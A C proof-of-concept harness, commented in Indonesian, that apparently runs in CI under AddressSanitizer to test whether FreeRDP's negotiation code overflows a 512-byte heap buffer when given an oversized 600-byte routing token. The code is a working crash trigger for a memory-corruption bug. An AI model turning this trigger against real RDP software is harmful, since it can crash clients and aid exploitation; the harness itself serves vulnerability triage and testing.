/*
 * harness_nego.c — PoC dinamis untuk klaster "nego->RoutingTokenLength" (hasil sift/triage).
 *
 * Yang dicoba dibuktikan (jalur redirection, GHSA-2vf2-grvj-6g8x):
 *   nego_set_routing_token(nego, token, len)      → nego->RoutingTokenLength = len
 *   nego_send_negotiation_request(nego, …)        → alokasi 512 B, lalu Stream_Write(…, RoutingTokenLength)
 *   ⇒ dengan token > 512 B, penulisan melewati batas alokasi → ASan: heap-buffer-overflow
 *
 * Dipakai di CI (.github/workflows/vulnres.yml). Build dengan -fsanitize=address.
 * Bila API internal berbeda antar versi, harness mencoba beberapa jalur dan melaporkan
 * mana yang tercapai (artefak: log ASan + stdout).
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <freerdp/freerdp.h>
#include <freerdp/settings.h>
#include <freerdp/nego.h>
#include <winpr/wlog.h>

#define TOKEN_LEN 600 /* > 512 (alokasi di nego_send_negotiation_request) */

int main(void)
{
	WLog* log = WLog_GetRoot();
	WLog_SetLogLevel(log, WLOG_WARN);

	const size_t len = TOKEN_LEN;
	unsigned char* token = (unsigned char*)malloc(len);
	if (!token)
		return 3;
	memset(token, 'A', len);
	/* header cookie agar menyerupai token routing nyata (Cookie: mstshash=..\r\n) */
	memcpy(token, "Cookie: mstshash=poc\r\n", 22);

	rdpSettings* settings = freerdp_settings_new(0);
	if (!settings)
	{
		fprintf(stderr, "[harness] gagal freerdp_settings_new\n");
		return 3;
	}
	if (!freerdp_settings_set_bool(settings, FreeRDP_RdpSecurity, TRUE))
		fprintf(stderr, "[harness] peringatan: set RdpSecurity gagal\n");

	rdpNego* nego = nego_new(settings);
	if (!nego)
	{
		fprintf(stderr, "[harness] gagal nego_new\n");
		return 3;
	}

	fprintf(stdout, "[harness] menyuntikkan routing token %zu byte\n", len);
	if (!nego_set_routing_token(nego, token, (UINT32)len))
	{
		fprintf(stderr, "[harness] nego_set_routing_token gagal\n");
		return 2;
	}
	fprintf(stdout, "[harness] RoutingTokenLength tersimpan; memanggil jalur pengiriman\n");
	fflush(stdout);

	/* jalur rentan (nego.c: alokasi 512 B lalu Stream_Write sepanjang RoutingTokenLength) */
	const BOOL ok = nego_send_negotiation_request(nego);

	fprintf(stdout, "[harness] nego_send_negotiation_request = %s\n", ok ? "TRUE" : "FALSE");
	fprintf(stdout, "[harness] SELESAI tanpa crash — jalur sink tidak tercapai (perlu transport/setup lain)\n");
	fflush(stdout);

	nego_free(nego);
	freerdp_settings_free(settings);
	free(token);
	return 0;
}
